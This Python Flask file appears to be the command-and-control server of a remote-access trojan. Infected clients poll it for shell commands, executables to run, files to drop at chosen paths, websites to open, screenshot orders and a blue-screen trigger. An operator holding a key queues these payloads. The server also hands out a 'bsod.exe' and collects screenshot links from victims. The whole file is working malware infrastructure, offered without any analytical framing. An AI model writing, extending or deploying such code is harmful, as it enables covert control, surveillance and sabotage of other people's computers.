from flask_limiter.util import get_remote_address
from flask import Response, request, Flask
from flask_limiter import Limiter
from threading import Thread
from base64 import b64encode
from hashlib import sha256
from time import sleep

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app)

command: str = ""
command_ips: list[str] = []

image: bytes = b""
image_ips: list[str] = []

bsod_activated: bool = False

runfile: bytes = b""
runfile_args: str = ""
runfile_ips: list[str] = []

screenshot_urls: list[bytes] = []
take_screenshot: bool = False
screenshot_ips: list[str] = []

website: str = ""
website_ips: list[str] = []

dropfile: bytes = b""
dropfile_location: str = ""
dropfile_ips: list[str] = []


# Centers


@app.route("/dropfile-center", methods=["GET"])
def runfile_center() -> Response:
    global dropfile_location, dropfile_ips, dropfile
    if len(dropfile) == 0:
        return Response("no files to drop", 204)
    else:
        remote_ip = get_remote_address()
        if remote_ip in dropfile_ips:
            return Response("u cant do that rn", 400)
        else:
            runfile_ips.append(remote_ip)
            return {
                "dropfile": b64encode(dropfile).decode(),
                "location": dropfile_location,
            }


@app.route("/website-center", methods=["GET"])
def website_center() -> Response:
    global website
    if len(website) == 0:
        return Response("no websites to open", 204)
    else:
        remote_ip = get_remote_address()
        if remote_ip in website_ips:
            return Response("u cant do that rn", 400)
        else:
            website_ips.append(remote_ip)
            return Response(website, 200)


@app.route("/screenshot-center", methods=["GET", "POST"])
def screenshot_center() -> Response:
    global take_screenshot, screenshot_urls
    if request.method == "GET":
        if not take_screenshot:
            return Response("no screenshots to take", 204)
        else:
            return Response("take screenshot", 200)
    elif request.method == "POST":
        remote_ip = get_remote_address()
        if take_screenshot and remote_ip not in screenshot_ips:
            screenshot_urls.append(request.args.get("download_page"))
            screenshot_ips.append(remote_ip)
            return Response("added url", 200)
        else:
            return Response("u cant do that rn", 400)


@app.route("/runfile-center", methods=["GET"])
def runfile_center() -> Response:
    global runfile_args, runfile
    if len(runfile) == 0:
        return Response("no files to execute", 204)
    else:
        remote_ip = get_remote_address()
        if remote_ip in runfile_ips:
            return Response("u cant do that rn", 400)
        else:
            runfile_ips.append(remote_ip)
            return {"runfile": b64encode(runfile).decode(), "args": runfile_args}


@app.route("/command-center", methods=["GET"])
def command_center() -> Response:
    global command
    if len(command) == 0:
        return Response("no commands to execute", 204)
    else:
        remote_ip = get_remote_address()
        if remote_ip in command_ips:
            return Response("u cant do that rn", 400)
        else:
            command_ips.append(remote_ip)
            return Response(command, 200)


@app.route("/image-center", methods=["GET"])
def image_center() -> Response:
    global image
    if len(image) == 0:
        return Response("no images to show", 204)
    else:
        remote_ip = get_remote_address()
        if remote_ip in image_ips:
            return Response("u cant do that rn", 400)
        else:
            image_ips.append(remote_ip)
            return image


@app.route("/bsod-center", methods=["GET"])
def bsod_center() -> Response:
    global bsod_activated
    if bsod_activated:
        return Response("1", 200)
    else:
        return Response("0", 204)


# Other


@app.route("/get_screenshots", methods=["GET"])
def get_screenshots() -> Response:
    if check_key(request.args.get("key")):
        global screenshot_urls
        return Response("|".join(screenshot_urls), 200)
    else:
        return Response("invalid key", 403)


# Posters


@app.route("/post_image", methods=["POST"])
def post_image() -> Response:
    if check_key(request.args.get("key")):
        global image
        image = request.files["image"].stream.read()
        Thread(target=post_image_thread, args=[image]).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_bsod", methods=["POST"])
def post_bsod() -> Response:
    if check_key(request.args.get("key")):
        global bsod_activated
        bsod_activated = True
        Thread(target=post_bsod_thread).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_command", methods=["POST"])
def post_command() -> Response:
    if check_key(request.args.get("key")):
        global command
        command = request.args.get("command")
        Thread(target=post_command_thread, args=[command]).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_runfile", methods=["POST"])
def post_runfile() -> Response:
    if check_key(request.args.get("key")):
        global runfile_args, runfile

        runfile_args = request.args.get("args")
        runfile = request.files["file"].stream.read()
        Thread(target=post_runfile_thread, args=[runfile, runfile_args]).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_screenshot", methods=["POST"])
def post_screenshot() -> Response:
    if check_key(request.args.get("key")):
        Thread(target=post_screenshot_thread).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_website", methods=["POST"])
def post_website() -> Response:
    if check_key(request.args.get("key")):
        global website
        website = request.args.get("website")
        Thread(target=post_website_thread, args=[website]).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_dropfile", methods=["POST"])
def post_dropfile() -> Response:
    if check_key(request.args.get("key")):
        global dropfile_location, dropfile

        dropfile = request.files["dropfile"].stream.read()
        dropfile_location = request.args.get("location")
        Thread(target=post_dropfile_thread, args=[dropfile, dropfile_location]).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


# Threads


def post_runfile_thread(data: bytes, args: str) -> None:
    global runfile_args, runfile_ips, runfile
    runfile = data
    runfile_args = args
    sleep(8)
    runfile = b""
    runfile_args = ""
    runfile_ips = []


def post_bsod_thread() -> None:
    global bsod_activated
    bsod_activated = True
    sleep(8)
    bsod_activated = False


def post_command_thread(command_arg: str) -> None:
    global command_ips, command
    command = command_arg
    sleep(8)
    command = ""
    command_ips = []


def post_image_thread(data: bytes) -> None:
    global image_ips, image
    image = data
    sleep(8)
    image = b""
    image_ips = []


def post_screenshot_thread() -> None:
    global screenshot_urls, take_screenshot, screenshot_ips
    take_screenshot = True
    sleep(8)
    take_screenshot = False
    sleep(5)
    screenshot_urls = []
    screenshot_ips = []


def post_website_thread(website_arg: str) -> None:
    global website_ips, website
    website = website_arg
    sleep(8)
    website = ""
    website_ips = []


def post_dropfile_thread(data: bytes, location: str) -> None:
    global dropfile_location, dropfile_ips, dropfile
    dropfile = data
    dropfile_location = location
    sleep(8)
    dropfile = b""
    dropfile_location = ""
    dropfile_ips = []


# Static


def check_key(key: str) -> bool:
    with open("data/key.txt", "r") as key_file:
        if key_file.read() == hash_key(key):
            return True
    return False


def hash_key(key: str) -> str:
    return sha256(key.encode()).hexdigest()


@app.route("/key.txt", methods=["GET"])
def easter_egg() -> Response:
    return Response("Hey, what are you doing there?", 418)


@app.route("/bsod.exe", methods=["GET"])
def server_bsod_exe() -> bytes:
    with open("static/bsod.exe", "rb") as bsod_file:
        return bsod_file.read()


@app.route("/", methods=["GET"])
def home() -> str:
    with open("static/index.html", "r", encoding="utf-8") as index_file:
        return index_file.read()


def main() -> None:
    app.run("0.0.0.0", 80)


if __name__ == "__main__":
    main()
